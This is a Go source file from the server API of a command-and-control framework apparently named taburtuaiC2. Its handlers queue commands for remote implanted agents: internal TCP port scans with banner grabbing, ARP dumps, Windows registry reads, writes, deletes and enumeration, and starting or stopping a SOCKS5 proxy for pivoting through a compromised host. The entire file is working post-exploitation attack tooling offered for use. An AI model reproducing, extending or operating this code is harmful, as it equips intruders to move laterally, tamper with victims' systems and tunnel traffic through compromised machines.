package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// ── Phase 11 — Network Recon ──────────────────────────────────────────────────

// NetScan queues a TCP port scan on the agent.
// POST /api/v1/agent/:id/pivot/netscan
// Body: { "targets":["192.168.1.0/24"], "ports":[22,80,443], "timeout":2, "workers":50, "grab_banners":false }
func (h *Handlers) NetScan(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}

	var req struct {
		Targets     []string `json:"targets"      binding:"required"`
		Ports       []int    `json:"ports"`
		Timeout     int      `json:"timeout"`
		Workers     int      `json:"workers"`
		GrabBanners bool     `json:"grab_banners"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || len(req.Targets) == 0 {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "targets required")
		return
	}
	if len(req.Ports) == 0 {
		req.Ports = []int{21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3389, 8080}
	}
	if req.Timeout <= 0 {
		req.Timeout = 2
	}
	if req.Workers <= 0 {
		req.Workers = 50
	}

	cmd := &types.Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		OperationType:   "net_scan",
		ScanTargets:     req.Targets,
		ScanPorts:       req.Ports,
		ScanTimeout:     req.Timeout,
		ScanWorkers:     req.Workers,
		ScanGrabBanners: req.GrabBanners,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         300,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "NET_SCAN",
		fmt.Sprintf("targets=%v ports=%d", req.Targets, len(req.Ports)), true)
	h.APIResponse(c, true, "Net scan queued", map[string]interface{}{
		"command_id": cmd.ID,
		"targets":    req.Targets,
		"ports":      req.Ports,
	}, "")
}

// ARPScan queues an ARP table dump on the agent.
// POST /api/v1/agent/:id/pivot/arpscan
func (h *Handlers) ARPScan(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "arp_scan",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "ARP_SCAN", "", true)
	h.APIResponse(c, true, "ARP scan queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// ── Phase 11 — Registry ───────────────────────────────────────────────────────

// RegRead queues a registry value read on the agent (Windows only).
// POST /api/v1/agent/:id/registry/read
// Body: { "hive":"HKLM", "key":"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "value":"ProductName" }
func (h *Handlers) RegRead(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}

	var req struct {
		Hive  string `json:"hive"  binding:"required"`
		Key   string `json:"key"   binding:"required"`
		Value string `json:"value" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "reg_read",
		RegHive:       req.Hive,
		RegKey:        req.Key,
		RegValue:      req.Value,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "REG_READ",
		fmt.Sprintf("%s\\%s\\%s", req.Hive, req.Key, req.Value), true)
	h.APIResponse(c, true, "Registry read queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// RegWrite queues a registry value write on the agent (Windows only).
// POST /api/v1/agent/:id/registry/write
// Body: { "hive":"HKCU", "key":"Software\\Test", "value":"MyVal", "data":"hello", "type":"sz" }
func (h *Handlers) RegWrite(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}

	var req struct {
		Hive  string `json:"hive"  binding:"required"`
		Key   string `json:"key"   binding:"required"`
		Value string `json:"value" binding:"required"`
		Data  string `json:"data"  binding:"required"`
		Type  string `json:"type"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}
	if req.Type == "" {
		req.Type = "sz"
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "reg_write",
		RegHive:       req.Hive,
		RegKey:        req.Key,
		RegValue:      req.Value,
		RegData:       req.Data,
		RegType:       req.Type,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "REG_WRITE",
		fmt.Sprintf("%s\\%s\\%s=%s", req.Hive, req.Key, req.Value, req.Data), true)
	h.APIResponse(c, true, "Registry write queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// RegDelete queues a registry key or value deletion on the agent (Windows only).
// POST /api/v1/agent/:id/registry/delete
// Body: { "hive":"HKCU", "key":"Software\\Test", "value":"MyVal" }  value optional
func (h *Handlers) RegDelete(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}

	var req struct {
		Hive  string `json:"hive" binding:"required"`
		Key   string `json:"key"  binding:"required"`
		Value string `json:"value"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "reg_delete",
		RegHive:       req.Hive,
		RegKey:        req.Key,
		RegValue:      req.Value,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	target := req.Hive + `\` + req.Key
	if req.Value != "" {
		target += `\` + req.Value
	}
	h.server.Logger.LogCommandExecution(agentID, "REG_DELETE", target, true)
	h.APIResponse(c, true, "Registry delete queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// RegList queues a registry key enumeration on the agent (Windows only).
// POST /api/v1/agent/:id/registry/list
// Body: { "hive":"HKLM", "key":"SOFTWARE\\Microsoft" }
func (h *Handlers) RegList(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}

	var req struct {
		Hive string `json:"hive" binding:"required"`
		Key  string `json:"key"  binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "reg_list",
		RegHive:       req.Hive,
		RegKey:        req.Key,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "REG_LIST",
		req.Hive+`\`+req.Key, true)
	h.APIResponse(c, true, "Registry list queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// ── Phase 11 — SOCKS5 Proxy Pivot ────────────────────────────────────────────

// SOCKS5Start instructs the agent to start an in-process SOCKS5 listener.
// POST /api/v1/agent/:id/pivot/socks5/start
// Body: { "addr": "0.0.0.0:1080" }
func (h *Handlers) SOCKS5Start(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}

	var req struct {
		Addr string `json:"addr"`
	}
	c.ShouldBindJSON(&req)
	if req.Addr == "" {
		req.Addr = "127.0.0.1:1080"
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "socks5_start",
		Socks5Addr:    req.Addr,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "SOCKS5_START", req.Addr, true)
	h.APIResponse(c, true, "SOCKS5 start queued", map[string]interface{}{
		"command_id": cmd.ID,
		"addr":       req.Addr,
	}, "")
}

// SOCKS5Stop instructs the agent to stop its SOCKS5 listener.
// POST /api/v1/agent/:id/pivot/socks5/stop
func (h *Handlers) SOCKS5Stop(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "socks5_stop",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       10,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "SOCKS5_STOP", "", true)
	h.APIResponse(c, true, "SOCKS5 stop queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// SOCKS5Status queries the SOCKS5 proxy status on the agent.
// POST /api/v1/agent/:id/pivot/socks5/status
func (h *Handlers) SOCKS5Status(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "socks5_status",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       10,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "SOCKS5_STATUS", "", true)
	h.APIResponse(c, true, "SOCKS5 status queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}
